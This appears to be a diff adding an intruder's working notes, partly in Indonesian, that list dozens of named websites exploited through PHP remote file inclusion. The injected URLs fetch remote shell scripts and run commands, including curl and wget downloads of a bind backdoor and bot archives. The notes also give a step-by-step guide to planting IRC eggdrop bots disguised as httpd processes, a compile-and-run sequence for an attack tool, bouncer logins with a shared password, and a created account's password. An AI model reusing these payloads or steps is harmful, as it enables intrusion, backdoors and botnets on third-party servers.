@@ -1,0 +1,456 @@
+http://www.ferrandi.org/cgi-bin/album.pl?full=1;configfile=|id|
+
+http://www.computerheini.at/index.php?open=http://ijoo.siteburg.com/sep.txt?&cmd=uname%20-a;id;wget
+
+http://www.mwasm.net/hajj/index.php?page=http://ijoo.siteburg.com/sep.txt?&cmd=uname%20-a;id;wget
+
+http://www.mwasm.net/
+
+http://windex.pl/index.php?open=http://ijoo.siteburg.com/sep2.txt?
+
+http://www.ecja-camp.de/index.php?site=http://ijoo.siteburg.com/sep.txt?&cmd=uname%20-a;id;wget
+
+http://www.soretec.de/index.php?site=http://ijoo.siteburg.com/sep.txt?&cmd=uname%20-a;id;wget
+
+http://www.occ.bz/main.php?id=http://ijoo.siteburg.com/sep.txt?&cmd=uname%20-a;id;wget
+
+http://www.toughgloves.com/cgi-bin/rjg.cgi/page=galpage3.htm|id|
+
+http://www.modeltrade.com/WebShop/admin
+http://ps2manuals.com/main_site.php?index=http://ijoo.siteburg.com/sep.txt?&cmd=uname%20-a;id;wget
+
+http://www.holly-lodge.org/index.php?page=http://ijoo.siteburg.com/sep2.txt
+
+
+http://www.goodbeginnings.net.au/main.php?page=http://freewebs.com/oikumene/s2.txt?&cmd=cd%20/usr/src/back.snort-2.1.3/etc;curl%20-o%20bind%20ijoo.kicks-ass.org/bind
+http://www.lametromc.com/index.php?main=http://ijoo.siteburg.com/sep.txt?&cmd=uname%20-a;id;wget
+http://www.triathlon.carpediemlabs.com/index2.php?page=http://ijoo.siteburg.com/sep.txt?&cmd=cd%20/dev/shm;curl%20-o%20bind%20ijoo.kicks-ass.org/bind
+
+http://www.phpwizard.org/modules/My_eGallery/public/displayCategory.php?basepath=http://mela.port5.com/1.jpg?&cmd=uname%20-a;id;cd%20/home/phpwizar/public_html/includes/.bot/;
+Bot Ji ---> Awan-Putih dkk
+eth0 inet addr:66.197.156.101  Bcast:66.197.156.111  Mask:255.255.255.240
+eth0:1 inet addr:66.197.156.102  Bcast:66.197.156.255  Mask:255.255.255.0
+eth0:2 inet addr:66.197.156.103  Bcast:66.197.156.255  Mask:255.255.255.0
+eth0:3 inet addr:66.197.156.104  Bcast:66.197.156.255  Mask:255.255.255.0
+eth0:4 inet addr:66.197.156.105  Bcast:66.197.156.255  Mask:255.255.255.0
+
+/s www.master-ucv.com 1978 rahasia -- rahman
+/s www.bb-hardware.com 1978 rahasia --- rhm
+/s www.mycroix.com 1978 rahasia --- arjuna
+
+http://www.mycroix.com/modules/Forums/images/avatars/gallery/data.php
+Root/home/.caleb/mycroix/mycroix.com/includes/.dat/
+
+Link encap:Ethernet  HWaddr 00:30:48:71:F2:6D  
+          inet addr:10.3.38.59  Bcast:10.3.38.255  Mask:255.255.255.0
+          EtherTalk Phase 2 addr:65280/167
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth0:0    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6D  
+          inet addr:10.3.38.54  Bcast:10.3.38.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1      Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.22  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:0    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.218.111  Bcast:205.196.218.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:1    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.10  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:2    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.208.162  Bcast:205.196.208.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:3    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.27  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:4    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.13  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:5    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.45  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:6    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.218.119  Bcast:205.196.218.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:7    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.221.204  Bcast:66.33.221.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:8    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.200  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:9    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.219.137  Bcast:205.196.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:10   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.52  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:11   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.38  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:12   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.213.163  Bcast:205.196.213.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:13   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.57  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:14   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.242  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:15   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.246  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:16   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.248  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:17   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.221.196  Bcast:66.33.221.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:18   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.214.169  Bcast:205.196.214.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:19   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.210.119  Bcast:205.196.210.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:1    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.10  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:20   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.210.136  Bcast:205.196.210.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:21   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.198  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:22   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.219.82  Bcast:205.196.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:23   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.199  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:24   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.221.23  Bcast:66.33.221.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:25   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.24  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:26   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.43  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:27   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.46  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:28   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.235  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:29   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.65  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:2    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.208.162  Bcast:205.196.208.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:10   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.52  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:12   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.213.163  Bcast:205.196.213.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:17   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.221.196  Bcast:66.33.221.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:18   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.214.169  Bcast:205.196.214.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:19   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.210.119  Bcast:205.196.210.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:22   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.219.82  Bcast:205.196.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:30   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.166  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:31   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.252  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:32   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.253  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:33   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.218  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:34   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.168  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:3    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.27  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:4    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.13  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:5    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.45  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:6    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.218.119  Bcast:205.196.218.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:7    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.221.204  Bcast:66.33.221.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:8    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.200  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:9    Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.219.137  Bcast:205.196.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:11   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.38  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:13   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.57  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:14   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.242  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:15   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.246  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:16   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.248  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:20   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:205.196.210.136  Bcast:205.196.210.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:21   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.198  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:23   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.199  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:24   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.221.23  Bcast:66.33.221.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:25   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.24  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:26   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.43  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:27   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.46  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:28   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.235  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:29   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.65  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:30   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.166  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:31   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.252  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:32   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.222.253  Bcast:66.33.222.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:33   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.205.218  Bcast:66.33.205.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+eth1:34   Link encap:Ethernet  HWaddr 00:30:48:71:F2:6C  
+          inet addr:66.33.219.168  Bcast:66.33.219.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+./nadya m.txt gadis-imut imut 66.33.219.22 madama arjuna^-
+a- k.txt error
+
+http://www.bb-hardware.com/modules/xgallery/cache/imgapp/data.php
+Root/usr/local/slash/apache/vhosts/bb-hardware.com/httpdocs/albums/.psy/
+213.196.3.170  
+ gcc -o ki bedenk
+ klo ada missing file bisa d pake
+ trus wget telangtelaso.org/tembak.c
+ trus gcc -o tembak tembak.c
+ ./tembak ipna org portna
+ port 53 klo server toh
+ atw 8080
+
+
+http://3ddesktops.kanvass.com/modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=cd%20/homepages/20/d107889695/htdocs/3dukdev/r/.dat/;./eggdrop%20-m%20a.txt
+./nadya a.txt madama mdm 66.33.219.168 madama arjuna^-
+
+http://www.master-ucv.com/modules/My_eGallery/public/displayCategory.php?basepath=http://mela.port5.com/1.jpg?&cmd=uname%20-a;id;cd%20/var/www/html/_vti_bin/.dat/;ps%20x
+/s www.master-ucv.com 1978 rahasia ident rahman ---> /usr/sbin/httpd 
+
+aa.txt n.txt /usr/local/apache/bin/httpsd   albums/
+c.conf d.conf
+
+lukas -> /usr/sbin/httpd a.txt b,c
+
+modules/4nAlbum/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=uname%20-a;id;wget
+
+Cara MUDAH Membuat BOT:   (autojoin #chanary)
+
+1. wget makassar.us/chanarybot.tar.gz
+2. tar -zvxf chanarybot.tar.gz
+3. cd .dat
+4. ./nadya fileconf nick ident IP channel owner
+            
+        contoh: ./nadya a.txt My-BoT denny 212.88.174.3 edp djalu32
+
+        a.txt  .................... file conf yg akan dibuat (akan terbuat dgn sendirinya)
+        My-BoT ...............nick bot
+        denny ...................ident bot
+        212.88.174.3 .......IP shell 
+        edp ..................... nama channel, jangan pake #
+        djalu32 ................ nick owner
+
+        catatan: bila nick mengandung karakter yg gak biasa mis: ` maka sebelum karakter tsb tambahkan tanda \ (backslash)
+        contoh: Ippan\`K (hanya melalui shell prompt)
+
+5. ./run fileconf  fakename (hanya melalui shell prompt)
+    fakename dapat dilihat dgn perintah ps -x, cari aja proses yg paling banyak terlihat
+
+    contoh ./run a.txt /usr/local/apache/bin/httpd  ( /usr/local/apache/bin/httpd = fake namenya)
+
+6. Bila melalui phpshell ato browser maka perintahnya: 
+
+                echo ./xh -s "/usr/local/apache/bin/httpd -DSSL" ./eggdrop -m a.txt > z;chmod 755 z;./z 
+                
+                catatan: /usr/local/apache/bin/httpd -DSSL  adalah fake namenya
+
+./nadya x.txt KulDesAkx Kuldesak 210.202.254.72 madama arjuna^-
+http://www.marine.com.tw//modules/My_eGallery/public/displayCategory.php?basepath=http://mela.port5.com/1.jpg?&cmd=uname%20-a;id;cd%20/home/marine/www/modules/My_eGallery/public/.dat/;
+
+http://www.bmwhouse.ee/modules/coppermine/themes/default/theme.php?THEME_DIR=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/var/www/vhost/bmwhouse/public_html/modules/coppermine/albums/userpics/.bot/;ps%20x
+
+http://www.bgnracing.com/modules/coppermine/themes/default/theme.php?THEME_DIR=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/home/john/www/buschseries.net/images/2005/.bot/scripts;./autobotchk%20aa.txt
+
+
+http://www.fieldtarget.net/modules/My_eGallery/public/displayCategory.php?basepath=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/var/www/html/new/modules/My_eGallery/gallery/bron/thumb/;mw%20.bot%20bron
+
+http://pppgkes.or.id/modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=cd%20/home/httpd/vhosts/pppgkes.or.id/httpdocs/spaw/images/lib3; <--- psy lib4 <---bot
+
+http://www.virtus.org.au/modules/coppermine/themes/default/theme.php?THEME_DIR=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/home/demons/www/modules/coppermine/lang/.dat;ls%20-Fla
+
+http://www.slipmat.nl/phpnuke/modules/coppermine/themes/default/theme.php?THEME_DIR=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/home/sites/site17/web/phpnuke/modules/Card/image/Flower/.bot/;wget%20geocities.com/romeo_arjuna2004/f.txt;./xh%20-s%20/usr/sbin/httpd-f/etc/httpd/conf/httpd.conf%20./eggdrop%20-m%20f.txt
+
+http://www.phpwizard.org/modules/My_eGallery/public/displayCategory.php?basepath=http://mela.port5.com/1.jpg?&cmd=uname%20-a;id;cd%20/home/phpwizar/public_html/includes/.bot/;
+
+Bot Ji ---> Awan-Putih dkk
+eth0 inet addr:66.197.156.101  Bcast:66.197.156.111  Mask:255.255.255.240
+eth0:1 inet addr:66.197.156.102  Bcast:66.197.156.255  Mask:255.255.255.0
+eth0:2 inet addr:66.197.156.103  Bcast:66.197.156.255  Mask:255.255.255.0
+eth0:3 inet addr:66.197.156.104  Bcast:66.197.156.255  Mask:255.255.255.0
+eth0:4 inet addr:66.197.156.105  Bcast:66.197.156.255  Mask:255.255.255.0
+===============================================
+http://www.fieldtarget.net/modules/My_eGallery/public/displayCategory.php?basepath=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/var/www/html/new/modules/My_eGallery/gallery;cd%20.psy;./run
+
+/s www.fieldtarget.net 31280 rahasia dong ID:Lord <--- undernet
+=================================================
+http://www.ozband.net/modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=uname%20-a;id;cd%20/home/ausba/public_html/modules/Calendar/.psy;./config%20arjuna%2031280;./fuck;./run
+psy /s www.ozband.net 31280 rahasia dong id:arjuna
+==============================
+http://www.straja.i-teh.com/modules/4nAlbum/public/displayCategory.php?basepath=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/home/clients/rdnii_ftp0/domains/straja.i-teh.com/html/modules/4nAlbum/temp/.bot/;wget%20geocities.com/romeo_arjuna2004/g.txt;./xh%20-s%20/usr/local/apache/bin/httpd%20./eggdrop%20-m%20g.txt
+
+psy /s 96027 rahasia dong ID;arjuna
+==========================================
+http://www.teamsoe.com//modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=uname%20-a;id;cd%20/usr/local/psa/home/vhosts/teamsoe.com/httpdocs/images/avatars/.bot/scripts;./autobotchk%20o.txt
+
+psy /s www.teamsoe.com 96027 rahasia dong ID; rhm rHm is ~rhm@209.218.194.3 * 
+/s www.bgnracing.com 96027 rahasia dong id: madamaCrew is ~arjuna@ustrucksalesemail.com * 
+=========================================
+http://lukas-rieger.de/modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=uname%20-a;id;cd%20/srv/www/htdocs/phptmp/.bot/scripts;./autobotchk%20b.txt
+
+/s lukas-rieger.de 1978 rahasia dong id:arjuna
+
+http://lukas-rieger.de/modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=uname%20-a;id;cd%20/srv/www/htdocs/phptmp/.bot/scripts;./autobotchk%20a.txt
+
+http://www.bgnracing.com/modules/coppermine/themes/default/theme.php?THEME_DIR=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/home/john/www/buschseries.net/images/2005/.bot/scripts;./autobotchk%20aa.txt
+
+http://www.fieldtarget.net/modules/My_eGallery/public/displayCategory.php?basepath=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/var/www/html/new/modules/My_eGallery/gallery/bron/thumb/;mw%20.bot%20bron
+
+http://pppgkes.or.id/modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.geocities.com/supernovakoe/bobol.txt?&cmd=cd%20/home/httpd/vhosts/pppgkes.or.id/httpdocs/spaw/images/lib3; <--- psy lib4 <---bot
+
+http://www.virtus.org.au/modules/coppermine/themes/default/theme.php?THEME_DIR=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/home/demons/www/modules/coppermine/lang/.dat;ls%20-Fla
+
+http://www.slipmat.nl/phpnuke/modules/coppermine/themes/default/theme.php?THEME_DIR=http://stelkers.mybesthost.com/y.txt?&cmd=uname%20-a;id;cd%20/home/sites/site17/web/phpnuke/modules/Card/image/Flower/.bot/;wget%20geocities.com/romeo_arjuna2004/f.txt;./xh%20-s%20/usr/sbin/httpd-f/etc/httpd/conf/httpd.conf%20./eggdrop%20-m%20f.txt
+===============================================================================
+
+http://www.bestdownload.com/
+
+rootshell.be/~mnbvcxz/bot.tar.gz ====> ./xh -s "[httpd]" ./eggdrop -m namaconf ====> crontabnya ./autobotchk namaconfnya
+
+Success!
+Your account rahman has been created. Your password is: 
+4o90Ziit 
+Bokep : http://www6.kinghost.com/asian/spy/warnet1.htm
+================================
